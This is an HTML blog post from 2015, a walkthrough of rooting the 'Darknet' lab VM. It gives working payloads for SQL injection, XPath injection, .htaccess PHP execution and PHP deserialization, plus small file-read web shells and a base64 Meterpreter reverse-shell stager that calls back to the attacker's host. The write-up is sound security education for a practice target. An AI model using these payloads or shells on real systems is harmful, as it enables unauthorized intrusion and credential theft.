@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>The Darkside of Darknet - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-06-09">June 09, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/darknet">darknet</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">The Darkside of Darknet</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>It was coming up to the date of my SANS GWAPT exam when Darknet landed, which meant I couldn&rsquo;t spend much time on it.  Since passing that exam, Darknet became my new evening activity.</p>
+
+<h2 id="port-scan:ce3f29a7309c858ac5469dc7533e0e59">Port Scan</h2>
+
+<pre><code class="language-text">PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          45933/udp  status
+|_  100024  1          58932/tcp  status
+58932/tcp open  status  1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          45933/udp  status
+|_  100024  1          58932/tcp  status
+</code></pre>
+
+<h2 id="a-bit-of-fuzzing:ce3f29a7309c858ac5469dc7533e0e59">A Bit of Fuzzing</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/port80.png"  />
+    
+    
+</figure>
+</div>
+
+<p>There is nothing much to see on this page, but after a quick fuzz we find a new directory.</p>
+
+<pre><code class="language-text">root@kali:~/darknet# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.56.102/FUZZ/
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00052:  C=200     14 L	      57 W	    937 Ch	  &quot; - access&quot;
+00181:  C=403     10 L	      30 W	    290 Ch	  &quot; - cgi-bin&quot;
+00427:  C=403     10 L	      30 W	    288 Ch	  &quot; - icons&quot;
+</code></pre>
+
+<p>Within this directory is a file called <code>888.darknet.com.backup</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/access.png"  />
+    
+    
+</figure>
+</div>
+
+<p>After reading it, we can see it&rsquo;s a Virtual Host config for Apache.</p>
+
+<pre><code class="language-text">&lt;VirtualHost *:80&gt;
+    ServerName 888.darknet.com
+    ServerAdmin devnull@darknet.com
+    DocumentRoot /home/devnull/public_html
+    ErrorLog /home/devnull/logs
+&lt;/VirtualHost&gt;
+</code></pre>
+
+<p>Adding <code>888.darknet.com</code> into <code>/etc/hosts</code> takes us to a new page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/login.png"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="sqli-much:ce3f29a7309c858ac5469dc7533e0e59">SQLi much?</h2>
+
+<p>This form seems to be vulnerable to SQL Injection, as entering a single quote in each field gives the following error:  <code>unrecognized token: &quot;3590cb8af0bbb9e78c343b52b93773c9&quot;</code>.  This &lsquo;token&rsquo; is the MD5 sum of the <code>'</code> character (which tells us the form is MD5&rsquo;ing the password before submission).  There also seems to be basic keyword filtering, as entering phrases such as <code>select</code> or <code>=</code> in the <code>username</code> field produces an <code>Illegal</code> message.</p>
+
+<p>The form requires both a username and password be present; so proceeding on the assumption <code>devnull</code> is a valid username, we can start testing injections.</p>
+
+<p>I was able to bypass this login page by replacing the <code>=</code> operator with <code>IS</code>:  <code>username=devnull' or 'a' is 'a&amp;password=rasta&amp;action=Login</code>.</p>
+
+<h2 id="sql-admin:ce3f29a7309c858ac5469dc7533e0e59">SQL Admin</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/admin-sql.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The next challenge we have is an SQL administrator box, where we can enter SQL commands and have them executed.  No feedback is given by the page, so everything is blind.  A popular approach to this, is to have the database write some data to a file.  With MySQL this can be achieved by using something like <code>select &lt;text&gt; into outfile &lt;file&gt;</code> (assuming write permissions are present etc).</p>
+
+<p>However, this is not MySQL, but SQLite.  For which I had to do some Googling to find the right syntax.</p>
+
+<pre><code class="language-text">attach database '/home/devnull/public_html/img/test.php' as rasta;
+create table rasta.test (code TEXT);
+insert into rasta.test (code) VALUES (&quot;&lt;?php phpinfo(); ?&gt;&quot;);
+</code></pre>
+
+<p>To find the writable directory I fuzzed <code>888.darknet.com</code> and since there weren&rsquo;t many options, I just tried each one in turn.</p>
+
+<pre><code class="language-text">00244:  C=403     10 L	      30 W	    287 Ch	  &quot; - css&quot;
+00430:  C=403     10 L	      30 W	    289 Ch	  &quot; - icons&quot;
+00432:  C=403     10 L	      30 W	    287 Ch	  &quot; - img&quot;
+00435:  C=403     10 L	      30 W	    292 Ch	  &quot; - includes&quot;
+</code></pre>
+
+<p>Browsing to the page confirms it worked, and also allows us to collect some important information about the environment we&rsquo;re in.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/sqli-phpinfo.png"  />
+    
+    
+</figure>
+</div>
+
+<p>A few things to note:</p>
+
+<pre><code class="language-text">disable_functions: system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec
+open_basedir: /etc/apache2:/home/devnull:/tmp
+</code></pre>
+
+<p>These disabled functions are going to make it a right pain to do anything.  To do more enumeration, I uploaded 2 more files: <code>dir.php</code> and <code>file.php</code>, which allowed me to view and read parts of the file system.</p>
+
+<h4 id="dir-php:ce3f29a7309c858ac5469dc7533e0e59">dir.php</h4>
+
+<pre><code class="language-php">&lt;?php echo '&lt;pre&gt;'; print_r(scandir($_REQUEST['dir'])); echo '&lt;/pre&gt;'; ?&gt;
+</code></pre>
+
+<h4 id="file-php:ce3f29a7309c858ac5469dc7533e0e59">file.php</h4>
+
+<pre><code class="language-php">&lt;?php $file = fopen($_REQUEST['file’],’r'); while(! feof($file)) { echo fgets($file). '&lt;br /&gt;'; } fclose($file); ?&gt;
+</code></pre>
+
+<pre><code class="language-text">http://888.darknet.com/img/dir.php?dir=.
+
+Array
+(
+    [0] =&gt; .
+    [1] =&gt; ..
+    [2] =&gt; dir.php
+)
+</code></pre>
+
+<p>Realistically, we can only traverse as far down as <code>/home/devnull</code> where there is a <code>database</code> directory, but we can&rsquo;t read inside it.  We can read <code>/tmp</code> but there is nothing in there, so that leaves <code>/etc/apache2</code>.</p>
+
+<pre><code class="language-text">http://888.darknet.com/img/dir.php?dir=/etc/apache2
+
+Array
+(
+    [0] =&gt; .
+    [1] =&gt; ..
+    [2] =&gt; apache2.conf
+    [3] =&gt; conf.d
+    [4] =&gt; envvars
+    [5] =&gt; magic
+    [6] =&gt; mods-available
+    [7] =&gt; mods-enabled
+    [8] =&gt; ports.conf
+    [9] =&gt; sites-available
+    [10] =&gt; sites-enabled
+)
+
+http://888.darknet.com/img/dir.php?dir=/etc/apache2/sites-enabled
+
+Array
+(
+    [0] =&gt; .
+    [1] =&gt; ..
+    [2] =&gt; 000-default
+    [3] =&gt; 888.darknet.com
+    [4] =&gt; signal8.darknet.com
+)
+</code></pre>
+
+<pre><code class="language-text">http://888.darknet.com/img/file.php?file=/etc/apache2/sites-enabled/signal8.darknet.com
+
+ServerName signal8.darknet.com
+ServerAdmin errorlevel@darknet.com
+DocumentRoot /home/errorlevel/public_html
+
+AllowOverride All
+</code></pre>
+
+<h2 id="signal8:ce3f29a7309c858ac5469dc7533e0e59">Signal8</h2>
+
+<p>Next, we can head on over to <code>signal8.darknet.com</code> and we find another new page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/signal8.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Clicking on these links (URLs <code>http://signal8.darknet.com/contact.php?id=1</code> and <code>?id=2</code>) takes us to a page where we are given an email address for <code>devnull</code> and <code>errorlevel</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/contact.png"  />
+    
+    
+</figure>
+</div>
+
+<p>There is a <code>robots.txt</code> file which contains the entry <code>Disallow: /xpanel/</code>.  Heading over there, you see another login page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/xpanel.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I didn&rsquo;t think this would be <em>another</em> SQLi challenge, so I went back to <code>contact.php</code>, widened my net and started fuzzing the URL.</p>
+
+<p>I used the OWASP-ZAP Fuzzer for this task (I like BurpSuite, but holy hell are the Intruder restrictions annoying!) by capturing a GET request on <code>contact.php</code> and fuzzing on the <code>id</code> parameter with the <code>Injections/All_attack.txt</code> file from <code>wfuzz</code>.  Regardless of the data you submit, a <code>200 OK</code> is always returned, so I was focused on the size of the response body.</p>
+
+<p>An empty response weighs in at anything up to 260 bytes (sometimes the body would include <code>h3</code> tags and sometimes not).  There were only 6 responses with a body size greater than 260 bytes, so I took a closer look at those.  The following request caught my eye: <code>count(/child::node())</code> because it returned the result <code>errorlevel@darknet.com</code>.</p>
+
+<p>This payload came from the <code>XML.txt</code> wordlist.</p>
+
+<p><em>&hellip; Fast forward many hours of Googling&hellip;</em></p>
+
+<h2 id="xml-injection:ce3f29a7309c858ac5469dc7533e0e59">XML Injection</h2>
+
+<p>I spent a lot of time reading up on how you could call and parse XML with PHP.  In my mind, I came up with something like this:</p>
+
+<pre><code class="language-php">$xml = simplexml_load_file('users.xml');
+$email = $xml-&gt;xpath('/user/id/email');
+echo $email;
+</code></pre>
+
+<p>The ID parameter is a variable defined by GET, which would probably look more like:</p>
+
+<pre><code class="language-php">$xml = simplexml_load_file('users.xml');
+$email = $xml-&gt;xpath('/user/[id=$GET]/email');
+echo $email;
+</code></pre>
+
+<p>In all the examples I read, those square brackets are indeed hardcoded and can be injected into a query, just like <code>'</code> with SQLi.</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=1][1
+'/user/[id=1]/email' becomes '/user/[id=1][1]/email'
+</code></pre>
+
+<p>This is valid and we get <code>errorlevel@darknet.com</code> as a result.  I want to start finding other bits of data that I can force the page to return, but to do that I need the name of the field.  Since I already know ID is a valid field, I tried to make it return that.</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=1]/id|/email[id=1][1
+1
+</code></pre>
+
+<p>That looks successful - I can double check with the <code>devnull</code> user to see if it returns a <code>2</code>.</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=2]/id|/email[id=2][1
+2
+</code></pre>
+
+<p>The next field I found was <code>username</code>.</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=1]/username|/email[id=1][1
+errorlevel
+</code></pre>
+
+<p>Time for the holy grail, and go for <code>password</code>?  Well that doesn&rsquo;t return anything, so it&rsquo;s not a valid field name.  But as we&rsquo;ve seen, Darknet likes to mix things up with bits of Spanish.  So we can try&hellip; <code>clave</code>?</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=1]/clave|/email[id=1][1
+tc65Igkq6DF
+</code></pre>
+
+<p>We can also pull the password for <code>devnull</code>.</p>
+
+<pre><code class="language-text">http://signal8.darknet.com/contact.php?id=2]/clave|/email[id=2][1
+j4tC1P9aqmY
+</code></pre>
+
+<h2 id="ploy:ce3f29a7309c858ac5469dc7533e0e59">Ploy</h2>
+
+<p>After using one of the username/password combo&rsquo;s to login, you are taken to another page, with a single link.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/xpanel2.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Clicking this takes you to <code>edit.php</code> which is a <code>Tr0ll</code> page.  Going back a step and looking at the source code of the previous page reveals these HTML comments:</p>
+
+<pre><code class="language-html">&lt;!--&lt;a href=&quot;ploy.php&quot;&gt;...&lt;/a&gt;--&gt;
+&lt;!--rasta-mouse is my her0--&gt;
+</code></pre>
+
+<p>I think he has the wrong rasta mouse :D</p>
+
+<p>Heading over to <code>xpanel/ploy.php</code>, we are met with what looks like a file upload facility, but it&rsquo;s protected by a PIN-code type challenge.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/pin.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Selecting an incorrect number of checkboxes gives you the error <code>La longitud de la clave no es la correcta!</code> (The key length is not correct!), so we can use this to determine that the PIN is 4 in length.</p>
+
+<p>Looking at the source code, each box has an associated value in the following layout:</p>
+
+<pre><code class="language-text">
+37 58 22
+12 72 10
+59 17 99
+
+</code></pre>
+
+<p>Within an example POST, we can clearly see the value for each checkbox.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/pin-post.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I went into lazy mode and used ZAP to fuzz on those values and iterate through the different combinations with the different checkbox values.  The downside to this approach, is that the fuzzer isn&rsquo;t smart enough to know you don&rsquo;t need to repeat values, or have the same value multiple times etc; so it took a little longer than is required - but this was probably still quicker than me sitting down to code something more efficient.  For a one-off task, who cares&hellip;</p>
+
+<p>&hellip; 6561 HTTP requests later, I now have to somehow find the 1 request with the correct PIN.  This is actually pretty easy in ZAP, as you can search your &lsquo;fuzzed results&rsquo; - so I did an inverse search on the string <code>Key incorrecta!</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/upload.png"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="subida-exitosa:ce3f29a7309c858ac5469dc7533e0e59">Subida Exitosa!</h2>
+
+<p>My test file uploaded successfully and going back to the HTTP request, I can see the correct PIN was <code>37 10 59 17</code>.  But now I also have to find the uploaded file.  More directory fuzzing within <code>xpanel</code> reveals an <code>upload</code> directory.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/test-file.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The next thing I tried, was to upload a new PHP file, but I got the error <code>Formato invalido!</code>.  I tried to get around this using filename manipulation and embedding PHP into images etc, but the web server just wasn&rsquo;t interpreting the code as PHP.</p>
+
+<p>I recalled that the virtual config for <code>signal8.darknet.com</code> had <code>AllowOverride All</code> set, which means I can dynamically alter the config with a custom <code>.htaccess</code> file.  I used this to exectute PHP from within the <code>.htaccess</code> file.</p>
+
+<pre><code class="language-text">AddHandler application/x-httpd-php .htaccess
+DirectoryIndex .htaccess
+&lt;FilesMatch &quot;^\.htaccess&quot;&gt;
+        Order deny,allow
+        Allow from all
+        SetHandler application/x-httpd-suphp
+&lt;/FilesMatch&gt;
+#&lt;?php phpinfo(); ?&gt;
+</code></pre>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/darknet-1/ht-phpinfo.png"  />
+    
+    
+</figure>
+</div>
+
+<p>This time around I saw that <code>open_basedir</code> is not set, so I should be able to read a lot more of the filesystem this time.  But I want some sort of functional shell, I don&rsquo;t want to be faffing around writing my own PHP for doing bits.  So I uploaded a PHP Meterpreter payload, which gave me enough functionality to list and read files etc.  I did this by putting PHP code into <code>.htaccess</code> to write base64 content out to a new file.</p>
+
+<pre><code class="language-text">AddHandler application/x-httpd-php .htaccess
+DirectoryIndex .htaccess
+&lt;FilesMatch &quot;^\.htaccess&quot;&gt;
+        Order deny,allow
+        Allow from all
+        SetHandler application/x-httpd-suphp
+&lt;/FilesMatch&gt;
+#&lt;?php $content = base64_decode(&quot;PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKIyBUaGUgcGF5bG9hZCBoYW5kbGVyIG92ZXJ3cml0ZXMgdGhpcyB3aXRoIHRoZSBjb3JyZWN0IExIT1NUIGJlZm9yZSBzZW5kaW5nCiMgaXQgdG8gdGhlIHZpY3RpbS4KJGlwID0gJzE5Mi4xNjguNTYuMTAxJzsKJHBvcnQgPSA0NDQ0OwokaXBmID0gQUZfSU5FVDsKCmlmIChGQUxTRSAhPT0gc3RycG9zKCRpcCwgIjoiKSkgewoJIyBpcHY2IHJlcXVpcmVzIGJyYWNrZXRzIGFyb3VuZCB0aGUgYWRkcmVzcwoJJGlwID0gIlsiLiAkaXAgLiJdIjsKCSRpcGYgPSBBRl9JTkVUNjsKfQoKaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOwoJJHNfdHlwZSA9ICdzdHJlYW0nOwp9IGVsc2VpZiAoKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigkaXAsICRwb3J0KTsKCSRzX3R5cGUgPSAnc3RyZWFtJzsKfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7CgkkcyA9ICRmKCRpcGYsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsKCSRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOwoJaWYgKCEkcmVzKSB7IGRpZSgpOyB9Cgkkc190eXBlID0gJ3NvY2tldCc7Cn0gZWxzZSB7CglkaWUoJ25vIHNvY2tldCBmdW5jcycpOwp9CmlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfQoKc3dpdGNoICgkc190eXBlKSB7IApjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsKY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7Cn0KaWYgKCEkbGVuKSB7CgkjIFdlIGZhaWxlZCBvbiB0aGUgbWFpbiBzb2NrZXQuICBUaGVyZSdzIG5vIHdheSB0byBjb250aW51ZSwgc28KCSMgYmFpbAoJZGllKCk7Cn0KJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsKJGxlbiA9ICRhWydsZW4nXTsKCiRiID0gJyc7CndoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgewoJc3dpdGNoICgkc190eXBlKSB7IAoJY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJfQp9CgojIFNldCB1cCB0aGUgc29ja2V0IGZvciB0aGUgbWFpbiBzdGFnZSB0byB1c2UuCiRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsKJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsKZXZhbCgkYik7CmRpZSgpOwo=&quot;); $file = fopen(&quot;/home/errorlevel/public_html/xpanel/uploads/shell.php&quot;,&quot;w&quot;); echo fwrite($file,$content); fclose($file); ?&gt;
+</code></pre>
+
+<p>You will of course notice that we are using <code>suphp</code>.  At first, I tried using plain ole&rsquo; regular <code>php</code> but it lacks the permission to write into <code>errorlevel</code>&rsquo;s home directory.  SuPHP is able to execute PHP files with the same permissions as its owner and we can see that the suPHP module is loaded in <code>/etc/apache2/mods-enabled/</code>.  Since we&rsquo;re in <code>/home/errorlevel</code> it&rsquo;s reasonable to assume <code>errorlevel</code> is also the owner of these PHP files.</p>
+
+<p>A <code>multi/handler</code> later and we have a shell.</p>
+
+<pre><code class="language-text">
+meterpreter &gt; sysinfo 
+Computer    : Darknet
+OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
+Meterpreter : php/php
+meterpreter &gt; getuid 
+Server username: errorlevel (1002)
+
+</code></pre>
+
+<h2 id="the-final-dark-hurdle:ce3f29a7309c858ac5469dc7533e0e59">The Final Dark Hurdle</h2>
+
+<pre><code class="language-text">
+Listing: /var/www
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40755/rwxr-xr-x   4096  dir   2015-04-26 15:22:35 +0100  Classes
+40755/rwxr-xr-x   4096  dir   2015-04-26 16:07:45 +0100  access
+100644/rw-r--r--  378   fil   2015-03-23 06:10:38 +0000  index.html
+100644/rw-r--r--  157   fil   2015-04-26 15:21:11 +0100  sec.php
+
+Listing: /var/www/Classes
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  163   fil   2015-04-26 15:22:35 +0100  Show.php
+100644/rw-r--r--  319   fil   2015-04-26 15:27:16 +0100  Test.php
+
+</code></pre>
+
+<h4 id="sec-php:ce3f29a7309c858ac5469dc7533e0e59">sec.php</h4>
+
+<pre><code class="language-php">
+&lt;?php
+
+require &quot;Classes/Test.php&quot;;
+require &quot;Classes/Show.php&quot;;
+
+if(!empty($_POST['test'])){
+    $d=$_POST['test'];
+    $j=unserialize($d);
+    echo $j;
+}
+?&gt;
+
+</code></pre>
+
+<h4 id="test-php:ce3f29a7309c858ac5469dc7533e0e59">Test.php</h4>
+
+<pre><code class="language-php">
+&lt;?php
+
+class Test {
+
+    public $url;
+    public $name_file;
+    public $path;
+
+    function __destruct(){
+        $data=file_get_contents($this-&gt;url);
+        $f=fopen($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, &quot;w&quot;);
+        fwrite($f, $data);
+        fclose($f);
+        chmod($this-&gt;path.&quot;/&quot;.$this-&gt;name_file, 0644);
+}
+}
+
+?&gt;
+
+</code></pre>
+
+<p>#### Show.php</p>
+
+<pre><code class="language-php">
+&lt;?php
+
+class Show {
+
+    public $woot;
+
+    function __toString(){
+        return &quot;Showme&quot;;        
+
+}
+    function Pwnme(){
+        $this-&gt;woot=&quot;ROOT&quot;;
+
+}
+
+}
+
+?&gt;
+
+</code></pre>
+
+<p>So the story here is fairly self explanatory - we need to POST a serialised string to <code>sec.php</code>, which is passed to <code>Test.php</code> and <code>Show.php</code>.  The end result is that a new file can be written to <code>/var/www</code> and have it <code>chmod'd</code> to set <code>root</code> as owner.  Given we are using <code>suphp</code>, this will also execute as root and give us a root shell.</p>
+
+<p>I generated placed a PHP Meterpreter payload into my <code>/var/www</code> folder, named it <code>root</code> and started <code>apache2</code>.</p>
+
+<h2 id="serialization:ce3f29a7309c858ac5469dc7533e0e59">Serialization</h2>
+
+<p>First checked my serialization was working, using the <code>Show</code> class.</p>
+
+<pre><code class="language-php">
+&lt;?php
+
+class Show {
+
+        public $woot = &quot;woot&quot;;
+
+}
+
+print serialize(new Show);
+
+?&gt;
+
+</code></pre>
+
+<pre><code class="language-text">
+# php pwn.php 
+O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:4:&quot;woot&quot;;}
+
+# curl 192.168.56.102/sec.php -d 'test=O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:4:&quot;woot&quot;;}'
+Showme
+
+</code></pre>
+
+<p>So, that&rsquo;s all good.  Now we just need to add in the <code>Test</code> class with my desired values.</p>
+
+<pre><code class="language-php">
+&lt;?php
+
+class Test {
+
+        public $url = &quot;http://192.168.56.101/root&quot;;
+        public $name_file = &quot;root.php&quot;;
+        public $path = &quot;/var/www&quot;;
+
+}
+
+class Show {
+
+        public $woot = &quot;woot&quot;;
+
+}
+
+$_test = (new Test);
+$_show = (new Show);
+
+print serialize(array($_test, $_show));
+
+?&gt;
+
+</code></pre>
+
+<pre><code class="language-text">
+# php pwn.php 
+a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:26:&quot;http://192.168.56.101/root&quot;;s:9:&quot;name_file&quot;;s:8:&quot;root.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;;}i:1;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:4:&quot;woot&quot;;}}
+
+# curl 192.168.56.102/sec.php -d 'test=a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:26:&quot;http://192.168.56.101/root&quot;;s:9:&quot;name_file&quot;;s:8:&quot;root.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;;}i:1;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:4:&quot;woot&quot;;}}'
+
+</code></pre>
+
+<p>Monitoring my Apache access log, I can see a GET request - a good sign!</p>
+
+<pre><code class="language-text">
+# tail -f /var/log/apache2/access.log 
+192.168.56.102 - - [13/Jun/2015:11:56:45 +0100] &quot;GET /root HTTP/1.0&quot; 200 1546 &quot;-&quot; &quot;-&quot;
+
+</code></pre>
+
+<p>So, time to fire up my <code>multi/handler</code> again&hellip;</p>
+
+<pre><code class="language-text">
+msf exploit(handler) &gt; exploit 
+
+[*] Started reverse handler on 192.168.56.101:4444 
+[*] Starting the payload handler...
+
+# curl http://192.168.56.102/root.php
+
+[*] Sending stage (40499 bytes) to 192.168.56.102
+[*] Meterpreter session 3 opened (192.168.56.101:4444 -&gt; 192.168.56.102:41202) at 2015-06-13 12:05:52 +0100
+
+meterpreter &gt; sysinfo 
+Computer    : Darknet
+OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
+Meterpreter : php/php
+meterpreter &gt; getuid 
+Server username: root (0)
+
+</code></pre>
+
+<p>Quick, grab dat flag!</p>
+
+<pre><code class="language-text">
+meterpreter &gt; cat /root/flag.txt
+      ___           ___           ___           ___           ___           ___           ___     
+     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
+    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
+   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
+  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
+ /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
+ \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
+  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
+   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
+    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
+     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 
+
+
+
+     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
+     tratando de llegar hasta aca. Eso es lo que realmente importa!.
+
+
+#Blog: www.securitysignal.org
+
+#Twitter: @SecSignal, @q3rv0
+
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
